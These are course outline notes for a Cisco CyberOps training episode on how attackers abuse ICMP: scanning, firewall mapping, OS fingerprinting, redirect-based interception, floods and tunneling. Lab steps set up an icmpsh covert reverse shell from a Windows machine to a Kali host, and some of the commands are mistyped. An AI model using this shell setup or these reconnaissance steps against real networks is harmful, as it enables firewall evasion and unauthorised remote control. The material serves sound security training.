###Cisco Cybersecurity Operations (Exam 210-255)
============================================================
{FileName}cisco-secops210255-2-4-describe_icmp-MMDDYY
{EpisodeName} Describe ICMP Instrusion
{ShowName}Cisco Cybersecurity Operations
{Keywords}Cisco FMC, Wireshark, Cisco IOS Netflow
#### Describe ICMP Instrusion
------------------------------------------------------------
* 2.2.f ICMP
	- Layer 3 protocol internal to IP and must be implemented if IP is used.
		+ ICMP Error Messages
		+ ICMP Query Messages
	- means to send error messages
	- Number code or "Message Type"; No ports but Type and Code
* Used Reconnaisance & Scanning 
	- ICMP Sweep:
	- ICMP (Destination) Unreachable: 
		+ ICMP **Protocol Unreachable** :attacker knows protocol
		  not used on target.
		+ ICMP **Port Unreachable** :  attacker knows port not
		  used on target
		+ ICMP Mask reply: allow router to report the correct
		  subnet mask for given network.
	- ICMP Source Quench: forced to drop datagrams due to congestion sends feedback to source--"SLOW DOWN"
		- Can be used for no good reason; not used very often
		- RFC 1812- deprecated (RFC 6633)
	- ICMP Time Exceeded: Datagram is dropped to TTL expiring. Device that drops send message to source
	- Traceroute: trace path to target and possible network
	  topology information
	- ICMP Message Demo:
``` 
Use Kali and Wireshark:
--start wireshark
--start terminal
--ping 172.16.89.50 (another machine on same network)
--ping 172.16.89.2 (default router)
--ping 4.2.2.1 (network--in routing table)
--ping 10.0.0.1 (network off of R2--in routing table)
--ping 8.8.8.1 (network off  of R2--in routing table)
--ping 192.168.1.1 (network off of R2 interface --not in routing able)
--traceroute to 10.0.0.1
--traceroute to 192.168.1.1
	- Firewalk: identifies ports that are open on firewall.
	  Maps out the filtering rules
		- Traceroute first to reach firewall
		- Scanning sets TTL packet to one greater than
		  firewall and tries to send to known host behind
		  firewall. If "Time exceeded" message is received,
		  then we know it returned from behind the firewall.
	- Inverse Mapping: maps internal hosts behind firewall
		+ Attacker sends ICMP reply to range of internal IP
		  addresses
		+ Targets receive the replies because it doesn't track
		  state of ICMP request.
		+ If internal router is present, the router will
		  respond with ICMP "Host Unreachable" for each host 
		  it cannot reach.
	- OS Fingerprinting: ICMP can be used to determine OS
		+ Sends UDP packet with DF bit set target whose UDP
	       port is closed
		+ "Destination unreachable port" will be returned
		+ Return packets will have precedence field set (ToS)
			- e.g. 0xc0 -- Linux Kernel 2.0+,2.2+,2.4+, Cisco
		       router or Extreme Network switch.
			- ICMP Error Quoting size are different between
			  OSes and networking devices
		+ TTL values of ICMP replies:
			- 128 (Windows)
			- 64 (Linux based)
	- ICMP Route Redirect: notifies sender of a better route to
	  destination.  
		+ This message is sent by the router.  It's routing
		  table shows that the Destination is on the same
		  network as the source host.
		+ This may indicate a MITM attack.
		+ Describe attack:
``` 
Simple Diagram 
-Attacker compromizes the router.
-Attacker uses router to send an open TCP message to PC1 (as PC2)
-When PC1 replies to PC2 (3a). Attacker sends ICMP route redirect message to source spoofing as R2.
-PC1 will change all data destined for PC2 through R1.
-Attacker will be able to read and modify then forward to R2
```
	- ICMP Router Discovery Messages
		+ Router Advertisement and Router Solicitation: a host can use to find out the IP address of router.
		+ MITM and DoS
		+ no authentication--allows for spoofing.
* ICMP Tunneling
	- covert connection between two remote hosts using ICMP echo
	  request and reply packets.
		+ bypasses firewall rules (hides traffic in ICMP
		  packets)
		+ Cannot be detected without packet inspection and
		  logs.
		+ icmpsh demo:
``` 
Kali Linux get icmpsh from git-hub
Windows 7 machines get icmpsh.exe from git-hub
Kali01: 
--Navigate to Downloads extract, then navigate to 
subfolder where you find icmpsh_m.py
--sysctrl -w net.ipv4.icmp_echo_ignore.all=1
--start Wireshark on appropriate Network Adapter
--sudo python icmpsh_m.py 172.16.89.145 172.16.89.150
Windows7:
--open cmd: navigate to folder of icmpsh downloads
--icmpsh.exe -t 172.16.89.145
Switch back to Kali
observe wireshark output.
use terminal and navigate windows system
stop wireshark capture, discuss the output in wireshark
```
	- ICMP Informational Messages
		+ "Oversized" ICMP Messages could crash host due the OS 
		  not programed to handle packets larger than RFC spec.
		+ Oversized  ICMP packets will cause some OS to stop and 
		  reboot.
* Denial of Service Attacks
	- ICMP Floods
	- Smurf Attacks



